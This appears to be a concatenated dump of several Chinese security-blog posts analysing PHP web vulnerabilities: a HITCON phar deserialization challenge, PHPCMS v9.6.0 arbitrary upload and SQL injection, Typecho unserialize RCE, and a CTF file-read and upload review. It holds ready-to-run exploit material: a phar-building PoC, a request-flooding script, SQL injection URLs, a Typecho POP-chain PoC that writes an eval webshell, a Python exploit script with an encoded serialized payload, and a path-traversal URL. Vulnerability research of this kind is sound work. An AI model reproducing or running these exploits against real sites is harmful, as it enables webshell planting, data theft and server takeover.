函数中具有反序列化的功能，但是 hash_equals 函数进行了数据校验，而 $SECRET 的值不可知。因此无法利用这点进行反序列化构造我们的payload 然后代码有两个类User、Admin。其分别是父类与子类。admin类中存在敏感函数eval。然后是一个 $_GET[&quot;lucky&quot;](); 这样的动态调用。 后面主要实现了两个功能，一个是写入一个文件，一个是返回文件路径。且对文件前几个字符进行了 GIF89a 的限制 之前是0day，现在已经有很多文章都分析过 phar 拓展反序列化的原理。 upload函数中 file_get_contents 这类文件相关操作会触发 phar，从而进行反序列化。 poc.php &lt;?phpclass Admin { public $avatar = &apos;orz&apos;; } $p = new Phar(__DIR__ . &apos;/avatar.phar&apos;, 0);$p[&apos;file.php&apos;] = &apos;&lt;?php ?&gt;&apos;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);rename(__DIR__ . &apos;/avatar.phar&apos;, __DIR__ . &apos;/avatar.gif&apos;);?&gt; 接着，我们需要通过大量请求，使 apache 重新开启一个新的线程 贴上 @orange 师傅的脚本 import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &apos;x.x.x.x&apos; PORT = xx s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&apos;GET /avatar.gif HTTP/1.1\\nHost: yourip\\nConnection: Keep-Alive\\n\\n&apos;) # s.close() print &apos;ok&apos; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) 加载我们服务器上的phar文件http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos; 利用脚本发出大量请求，使 apache 重新开启一个新的线程 最后访问http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1 HITCON 2018待更新…","link":"/2020/02/17/HITCON-%E4%B8%89%E9%A2%98%E9%80%92%E8%BF%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"PHPCMS v9.6.0 两个漏洞分析","text":"任意文件上传（CVE-2018-14399） + wap模块 SQL注入 任意文件上传（CVE-2018-14399）漏洞复现漏洞危害：该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。 漏洞触发位置在 会员注册 这个界面。地址为 ip/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 POST参数如下 siteid=1&amp;modelid=11&amp;username=P2hm1n&amp;password=P2hm1n&amp;email=123456@qq.com&amp;info[content]=&lt;img src=你的shell&gt;&amp;dosubmit=1&amp;protocol= 访问爆出上传地址 能shell 漏洞分析文件目录 phpcms/modules/member/index.php index.php 大致实现功能：会员前台管理中心、账号管理、收藏操作类 触发漏洞点方法是 register 大致逻辑是 获取用户siteid，定义站点id常量，加载用户模块配置，加载短信模块配置 第 134-135 行 发现可控变量 $_POST[‘info’] 经过漏洞复现我们可以知道这是 exp 的关键参数 先看 134 行的处理，将 $_POST[‘info’] 这个参数经过了new_html_special_chars这个函数过滤。跟进函数分析 /** * 返回经addslashe处理过的字符串或数组 * @param $obj 需要处理的字符串或数组 * @return mixed */function new_html_special_chars($string) { $encoding = &apos;utf-8&apos;; if(strtolower(CHARSET)==&apos;gbk&apos;) $encoding = &apos;gb2312&apos;; if(!is_array($string)) return htmlspecialchars($string,ENT_COMPAT,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;} 主要功能是做了 html 转义。对我们漏洞利用没有太大阻碍。接着跟进一下 135行的 $member_input-&gt;get() 方法 方法位置：caches/caches_model/caches_data/member_input.class.php function get($data) { $this-&gt;data = $data = trim_script($data); $model_cache = getcache(&apos;member_model&apos;, &apos;commons&apos;); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid][&apos;tablename&apos;]; $info = array(); $debar_filed = array(&apos;catid&apos;,&apos;title&apos;,&apos;style&apos;,&apos;thumb&apos;,&apos;status&apos;,&apos;islink&apos;,&apos;description&apos;); if(is_array($data)) { foreach($data as $field=&gt;$value) { if($data[&apos;islink&apos;]==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field][&apos;name&apos;]; $minlength = $this-&gt;fields[$field][&apos;minlength&apos;]; $maxlength = $this-&gt;fields[$field][&apos;maxlength&apos;]; $pattern = $this-&gt;fields[$field][&apos;pattern&apos;]; $errortips = $this-&gt;fields[$field][&apos;errortips&apos;]; if(empty($errortips)) $errortips = &quot;$name 不符合要求！&quot;; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(&quot;$name 不得少于 $minlength 个字符！&quot;); if (!array_key_exists($field, $this-&gt;fields)) showmessage(&apos;模型中不存在&apos;.$field.&apos;字段&apos;); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) { showmessage(&quot;$name 不得超过 $maxlength 个字符！&quot;); } else { str_cut($value, $maxlength); } if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field][&apos;isunique&apos;] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != &apos;edit&apos;) showmessage(&quot;$name 的值不得重复！&quot;); $func = $this-&gt;fields[$field][&apos;formtype&apos;]; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; } } return $info;} 首先将 data 经过一个 trim_script 的处理。但是 trim_script 大多都是处理 xss 有关漏洞的过滤。几个正则将xss的关键 payload 进行了替换 第27行，核心 if 判断条件 if(is_array($data)) 。我们 payload 中 info[content]=&lt;img src=你的shell&gt; 就是一个数组。因此继续跟进，发现将数组进行遍历，键名为$field，键值为$value 第30行，$field 进行一次 safe_replace 处理。主要过滤一些类似单引号，尖括号等可能产生 XSS，SQL注入的符号 之后经过一些注册时正常的判断逻辑代码 47-48行 $func = $this-&gt;fields[$field][&apos;formtype&apos;];if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); 先是定义了一个 $func ，然后下面的if语句判断方法如果存在就带入这个函数。 挨个查看方法中，在 editor 方法中 的一句话。调用了 attachment 类的 download 函数 $value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); 跟进文件 phpcms/libs/classes/attachment.class.php /** * 附件下载 * Enter description here ... * @param $field 预留字段 * @param $value 传入下载内容 * @param $watermark 是否加入水印 * @param $ext 下载扩展名 * @param $absurl 绝对路径 * @param $basehref */ function download($field, $value,$watermark = &apos;0&apos;,$ext = &apos;gif|jpg|jpeg|bmp|png&apos;, $absurl = &apos;&apos;, $basehref = &apos;&apos;) { global $image_d; $this-&gt;att_db = pc_base::load_model(&apos;attachment_model&apos;); $upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;); $this-&gt;field = $field; $dir = date(&apos;Y/md/&apos;); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) { if(strpos($matche, &apos;://&apos;) === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); } unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) { if(strpos($file, &apos;://&apos;) === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); $newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) { $oldpath[] = $k; $GLOBALS[&apos;downloadfiles&apos;][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark){ watermark($newfile, $newfile,$this-&gt;siteid); } $filepath = $dir.$filename; $downloadedfile = array(&apos;filename&apos;=&gt;$filename, &apos;filepath&apos;=&gt;$filepath, &apos;filesize&apos;=&gt;filesize($newfile), &apos;fileext&apos;=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; } } return str_replace($oldpath, $newpath, $value); } 首先限制了其中 $ext 只允许为gif|jpg|jpeg|bmp|png 153行 进行了一个过滤 if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&apos;]?)([^ \\&quot;&apos;&gt;]+\\.($ext))\\\\2/i&quot;, $string, $matches)) return $value; 这里匹配了src或href中文件的文件名，不过后缀为$ext，其中$ext的值为：gif|jpg|jpeg|bmp|png http://ip/p2hm1n.php#a.jpg 即可绕过正则 158行 使用了 fillurl 函数远程加载资源，还吧 # 之后的字符全部移除 $pos = strpos($surl,&apos;#&apos;);if($pos&gt;0) $surl = substr($surl,0,$pos); P2hm1n.php#a.jpg 会被处理成 P2hm1n.php 之后调用 download 方法。程序直接调用 copy 函数将远程文件复制到本地 wap模块 SQL注入漏洞复现访问 http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1 PS: 默认安装是不具备war模块的，跟进后台看了一下，好像跟手机门户网站有关，但其实并不影响漏洞的利用 直接发包至 repeater 模块。 将返回的 Set-Cookie 中TVAUD_siteid值附值给 userid_flash变量因此 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 访问 http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26 并 POST 传参 userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY 将返回的 Set-Cookie 中TVAUD_att_json值附值给 a_k参数 GET型访问 http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw 漏洞分析漏洞触发点在 phpcms/modules/content/down.php 的 init() 函数12 行 GET方式传入 a_k参数14 行 根据 DECODE 判断其 sys_auth 为一个解密函数。直接证明——》a_k参数之前是经过加密的。这个解密流程其实很长，我们其实不用去看它的一个解密流程。17 行 使用 parse_str() 函数处理 。 parse_str() 函数会自动对传入的值将其根据&amp;分割，然后解析到具体变量并注册变量，并且对内容进行URL解码操作。26 行 引用未注册变量 array(‘id’=&gt;$id) ，但这里的id可以从parse_str函数处理$a_k后得到。且调用 get_one 方法。 get_one方法定义点在 /phpcms/libs/classes/model.class.php 73-76行。跟进发现这里的 get_one 方法其实就是 SQL 查询。且用到了 sqls 方法。跟进 sqls 方法，这里是对数组参数的一个处理过程。且从头到位都没有对$id 参数进行过滤处理。因此存在 sql 注入漏洞 现在我们根据 从parse_str函数处理$a_k后得到的 id 推断出了存在 sql注入。但是由于之前我们推断中忽略的是一个解密流程。因此其实我们需要找到带有 sql注入payload 经过一次加密之后的 payload。 核心目的：构造加密后的 $a_k 变量 思路一：伪造加密过程：直接对应源码中加密代码，进行本地加解密。产生问题：源码中对应的 auth_key 值来自服务器。且每个站点这个 auth_key 可能不一样。 思路二：寻找源码中调用此加密的地方。且可回显加密后代码方法： 全局搜索 sys_auth 。phpcms\\libs\\classes\\param.class.php 中存在 set_cookie 方法寻找哪里没有过滤sql注入的传入点。且可通过 cookie 加密获得加密后 payload关键点：phpcms/modules/attachment/attachments.php 的 swfupload_json 方法。 public function swfupload_json() { $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]); $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;])); $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie(&apos;att_json&apos;); $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) { return true; } else { $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str; param::set_cookie(&apos;att_json&apos;,$json_str); return true; }} 通过 GET 传入三个参数，第一个参数 aid 经过了 intval 函数处理，那么不太适合通过此处传入payload。第二个参数 src 经过了 safe_replace处理。第三个 filename 通过 safe_replace 和 一次url 编码处理。之后做 json_encode 的操作，最终再调用 set_cookie 方法。跟进一下 safe_replace 方法，发现是通过 str_replace 进行处理，且没有通过循环遍历来过滤，它只执行一次。那么两两组合一下，然后替换，从而达到 bypass 的效果。 但是在触发 set_cookie 的 swfupload_json 方法，之前有一定的条件。在phpcms/modules/attachment/attachments.php第十行的 attachments 类。其中 __construct 方法，相当于做类的初始化工作。其中有用户登录状态检测。21行限制 $this→userid 不能为空，否则跳转到登录界面17 行 程序并没有检查 $this-&gt;userid 的有效性，所以只要传入的 userid_flash 是加密值就能够解密就可以通过检测。获取 userid_flash加密值：在phpcms/modules/wap/index.php 文件。通过 cookie 获取 $_GET[‘siteid’] 加密后的数据，然后再作为 $_POST[‘userid_flash’] 的值，即可绕过登录检测。 参考文章 https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/https://www.hackersb.cn/hacker/219.htmlhttps://www.freebuf.com/articles/web/202914.htmlhttp://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/","link":"/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Typecho 反序列化漏洞分析","text":"Typecho 反序列化漏洞分析和一些坑点 漏洞概述 Typecho是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，目前使用SVN来做版本管理。 触发点在 ./install.php 。是一个反序列化导致的任意代码执行，从而实现前台 getshell。 受影响版本：GitHub上2017年10月24日之前的所有版本。 漏洞分析漏洞触发点在 ./install.php。定位敏感函数 unserialize。这里其实定位到了两个有关利用点，但是其实只有第一处能够利用。相关代码在 231-237行 &lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));Typecho_Cookie::delete(&apos;__typecho_config&apos;);$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db);寻找unserialize函数中变量是否可控。可见先经过一次 base64_decode 函数解码，然后调用的是 Typecho_Cookie 类下的get方法。 public static function get($key, $default = NULL){ $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value;} 关键点在 value 附值处。可见设定了两个三元运算符进行嵌套, 通过 $_COOKIE 和 $_POST 对其附值。可见这里我们可以直接通过 POST 方法来控制 key 的变量，从而控制 value 。 现在我们已经拥有了反序列化的点(unserialize),和我们的可控变量（$_POST 对__typecho_config 附值）。 思考：我们通过反序列化得到了什么？——》 $config变量的可控性。 紧接着体现 $config 变量可控性的地方在 $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);。 程序通过 Typecho_Db 进行了实例化。跟进方法 &lt;?phpclass Typecho_Db{ public function __construct($adapterName, $prefix = &apos;typecho_&apos;) { /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName; if (!call_user_func(array($adapterName, &apos;isAvailable&apos;))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;); } $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName(); }} 关键代码为 $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;， 这里进行了一个字符串的拼接。且 adapterName 是我们可控的。如果我们传入一个类，PHP就会做一个从类到字符串的强制类型转换。由此会触发那个类的 toString 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。 接着我们就开始寻找我们可利用的 tostring 方法。一共三处，我们可以利用的只有 var/Typecho/Feed.php 一处。截取部分代码 class Typecho_Feed{ private $_items = array(); /** * $item的格式为 * &lt;code&gt; * array ( * &apos;title&apos; =&gt; &apos;xxx&apos;, * &apos;content&apos; =&gt; &apos;xxx&apos;, * &apos;excerpt&apos; =&gt; &apos;xxx&apos;, * &apos;date&apos; =&gt; &apos;xxx&apos;, * &apos;link&apos; =&gt; &apos;xxx&apos;, * &apos;author&apos; =&gt; &apos;xxx&apos;, * &apos;comments&apos; =&gt; &apos;xxx&apos;, * &apos;commentsUrl&apos;=&gt; &apos;xxx&apos;, * &apos;commentsFeedUrl&apos; =&gt; &apos;xxx&apos;, * ) * &lt;/code&gt; * * @access public * @param array $item * @return unknown */ public function addItem(array $item) { $this-&gt;_items[] = $item; } # ~ ~ ~ ~ ~ ~ 省略部分代码 foreach ($this-&gt;_items as $item) { $content .= &apos;&lt;item&gt;&apos; . self::EOL; $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL; $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL; $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL; $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL; $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; 关键点在 290行， $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; ，这里我们可控 $item[&apos;author&apos;]。当他被设置一个类，且从不可访问的属性screenName读取数据时，会调用 __get 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。——&gt; Feed.php 中控制 $item[&apos;author&apos;] 去触发传入类的 __get 方法。 接着我们开始寻找 __get 方法。找到我们可以利用的文件 Request.php class Typecho_Request{ public function __get($key) { return $this-&gt;get($key); }}跟进里面调用的 get 函数 class Typecho_Request{ public function get($key, $default = NULL) { switch (true) { case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; } $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); } 最后 return 返回值经过了 _applyFilter 处理，跟进 _applyFilter class Typecho_Request{ private function _applyFilter($value) { if ($this-&gt;_filter) { foreach ($this-&gt;_filter as $filter) { $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); } $this-&gt;_filter = array(); }发现敏感函数: call_user_func 。且 $filter通过 private $_filter = array(); + foreach ($this-&gt;_filter as $filter) 得到，$filter可控。$value 通过 _params[$key]间接得到，所以也是可控的。 由此完成了我们的POP链 但在到达反序列化利用点（unserialize函数）之前，代码进行了两个限制。大概功能在注释中也写的清楚明了了。 //判断是否已经安装if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) { exit;}// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) { if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) { exit; } $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]); if (!empty($parts[&apos;port&apos;])) { $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;; } if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) { exit; }}针对第一点: 通过GET传参 finish 就能绕过； 针对第二点： refer来自本站即可 最后有一个坑来自于 install.php 最开头的 ob_start();。 @LoRexxar师傅提到 因为我们上面对象注入的代码触发了原本的exception，导致ob_end_clean()执行，原本的输出会在缓冲区被清理。 我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。 这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 同时 @pupiles 师傅也在blog中指出，由于调用了ob_end_clean方法清空了缓冲区。导致没有回显，但是php还是可以成功执行的，可以直接通过 file_put_contents 写入shell 解决了这个问题，整个利用ROP链就成立了 最终POP链为:install.php 中的 unserialize反序列化可控 $config 值导致的 $config[&apos;adapter&apos;]可控。——》Db.php 中进行PHP类型强制转换，触发 $config[&apos;adapter&apos;]可控类的 __tostring 方法——》Feed.php 中 __tostring 方法内调用可控制类从不可访问的属性读取数据$item[&apos;author&apos;]-&gt;screenName) 触发 __get方法——》Request.php 中 __get方法调用 get 方法，调用 _applyFilter方法中 的 call_user_func，控制其内两个参数实现命令执行 其实光看POP链不怎么复杂，但是里面每一步构造，每一个方法的尝试调用都是要经过很多次的跟进和分析的。 编写 POC &amp; EXP顺着 @pupiles 师傅 bypass ob_start() 的思路写的POC。但是使用 @pupiles 师傅blog中的 POC 可能有一点小问题。由于PHP中双引号具有解析效果，这里的 POST 会被解析，最终写入的 webshell 的代码为 &lt;?php @eval()?&gt; 因此改良POC如下 &lt;?php//编写最后 call_user_func 函数利用的类class Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = &apos;assert&apos;; //采用传统回调利用，call_user_func + assert $this-&gt;_params[&apos;screenName&apos;] = &apos;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[P2hm1n]); ?&gt;&quot;)&apos;; //bypass ob_start()限制 }}class Typecho_Feed{ const RSS2 = &apos;RSS 2.0&apos;; private $_type; private $_items = array(); public function __construct(){ $this-&gt;_type = self::RSS2; $this-&gt;_items[0] = array( &apos;author&apos; =&gt; new Typecho_Request(), ); }}$final = new Typecho_Feed();$poc = array( &apos;adapter&apos; =&gt; $final, &apos;prefix&apos; =&gt; &apos;typecho_&apos;);echo urlencode(base64_encode(serialize($poc)));?&gt; 还有一种办法就是利用造成一个报错来构造POC。核心代码如下 public function __construct(){ $this-&gt;_type = $this::RSS2; $this-&gt;_items[0] = array( &apos;category&apos; =&gt; array(new Typecho_Request()), &apos;author&apos; =&gt; new Typecho_Request(), ); } 最后简单的exp编写如下，没有对url做细致的处理。异常处理也不够细致。 import requestsurl = &apos;http://typecho/&apos;def exp(url): if &quot;http//&quot; or &quot;https://&quot; in url: url = url else: url = &apos;http://&apos; + url target = url + &apos;/install.php?finish&apos; fakerefer = url + &apos;/install.php&apos; payload = &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D&apos; headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;, &apos;Referer&apos;: fakerefer, &apos;cookie&apos;: payload } try: html = requests.get(url=target, headers=headers, timeout=5) if html.status_code == 404: return &apos;no install.php&apos; else: print(&apos;mkdir:./shell.php, shell_password=P2hm1n&apos;) except: print(&apos;something wrong&apos;)if __name__ == &apos;__main__&apos;: exp(url) 漏洞复现首先正常安装 typecho，本地环境 MacOS + MAMP PRO(PHP7.3.9+Mysql5.7) 安装过程中需要自己去数据库里新建一个空数据库，安装过程并不会帮助你新建一个空的数据库然后写入数据。 访问 url 为 http://typecho/install.php?finish。 refer设置根据自身情况改变 POST参数如下__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D 即可在当前目录下生成 shell.php 文件，密码为 P2hm1n 参考链接https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/https://paper.seebug.org/424/","link":"/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"网鼎杯线下半决赛 faka 题目复盘","text":"半决赛没有做出来，感觉有些遗憾。因此还是决定下来复盘一下。 情景再现比赛时的想法题目源码结构 其实在拿到源码时就不断揣测出题人的意图 题目中的 hint 也给到：www-data 权限用户可写目录只有 runtime 跟 static。所以当时就想好了审计的重点： 各类文件操作函数 + 写入路径可控 RCE + file_put_contents （如果真能RCE，貌似也不用写shell，直接读就行） SQLi 然后 html 下面给到了 1.txt 里面的信息是注册邀请码 当时还以为这么明显的提示一定是暗示什么（结果好像这个txt并没有什么用？），还以为是从index.php/register 利用注册码进去，然后打 /merchant。结果在 /merchant 找了半天也没找到漏洞点。 然后看到跟 html 同级目录下的 tk.sql。 当时找到了md5之后以为能进后台。但是现场还是断网环境（WTF？那我怎么解？）用常见弱密码单向生成后比对也没有发现有相同的。同时还不能爆破后台，也没什么万能密码这类的东西。 然后当时题目环境还是 tp5.0.14。RCE 貌似ban了好多函数。当时妄想通过非预期解一下题目。 最后还是坚信漏洞点在： /merchant 下面。一下午的时间就在 /merchant 的审计和 tp5 RCE 的绕过度过了… 赛后实验室的小伙伴 @jokuuy 告诉我后台部分功能点未授权 orz。而且之前他审过这个 CMS，据说10s可以秒掉23333 反思和小结当时没考虑到未授权…未授权的话可以直接利用很多后台的漏洞（当时就看到了manage/backup 那个点），但是没有进到后台。所以没有能够利用到manage 和 admin 两个目录下的代码。 题目分析获取后台权限http://wdb-vul/index.php/admin/index/info 未授权添加用户 之后访问某些存在漏洞的路由会发生这样的情况 提示权限不够。 在 SQL 列中，authorize 起到了权限限制的作用 回溯 authorize 的控制 application/admin/controller/Index.php#info 跟进 _form， callback 调用 _form_filter 跟进 _form_filter 说明直接 POST 参数即可。 任意文件读取application/manage/controller/Backup.php#downloadBak finename可控，目录穿越 Exp: http://wdb-vul/index.php/manage/backup/downloadBak?file=../../../../../../../../../Users/p2hm1n/Desktop/flag 文件上传发现先知已经有师傅写了一个文件上传的漏洞点了 https://xz.aliyun.com/t/7838 跟着复现分析一波。 application/admin/controller/Plugs.php 主要是文件上传的一些校验。 上传的时候会先调用 upstate，主要作用如下： 将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀 检测文件是否上传 生成 config 数组，并添加每一个键的值 之后调用 upload ，这里看文件上传处理的位置 跟进 move 跟进 buildSaveName final POC 上传至 static 目录","link":"/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/"},{"title":"以购物流程挖掘商城漏洞","text":"文章首发于先知社区：https://xz.aliyun.com/t/6194 